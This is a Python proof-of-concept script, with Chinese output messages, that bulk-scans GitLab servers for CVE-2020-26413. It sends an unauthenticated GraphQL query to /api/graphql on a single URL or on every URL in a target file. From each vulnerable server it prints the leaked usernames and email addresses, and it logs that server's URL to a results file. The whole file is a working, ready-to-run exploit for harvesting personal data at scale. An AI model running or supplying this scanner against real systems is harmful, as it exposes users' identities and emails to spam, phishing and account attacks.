import json
import requests
import argparse
import urllib3
import sys
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings()


def title():
    print("""
             GitLab Graphql邮箱信息泄露漏洞 (CVE-2020-26413)批量扫描POC
                      use: python3 Gitlab_CVE-2020-26413.py
                      Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        vuln_url = self.url + "/api/graphql"
        user_number = 0
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/json",
        }
        try:
            data = """
                {"query":"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }","variables":null,"operationName":null}
                """
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
            if "email" in response.text and "username" in response.text and "@" in response.text and response.status_code == 200:
                print('\033[32m[o] 目标{}存在漏洞, 泄露用户邮箱数据....... \033[0m'.format(self.url))
                for i in range(0, 999):
                    try:
                        username = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["username"]
                        email = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["email"]
                        user_number = user_number + 1
                        print('\033[34m[o] 用户名:{} 邮箱:{} \033[0m'.format(username, email))
                    except:
                        print("\033[32m[o] 共泄露{}名用户邮箱账号 \033[0m".format(user_number))
                with open("GitLab Graphql邮箱信息泄露漏洞结果.txt", mode="a") as response:
                    response.write(self.url + "\n")
            else:
                print("\033[31m[x] 不存在漏洞 \033[0m")
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="xGitLab Graphql邮箱信息泄露漏洞 (CVE-2020-26413)")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 Gitlab_CVE-2020-26413.py -u http://127.0.0.1\neg2:>>>python3 Gitlab_CVE-2020-26413.py -f target.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
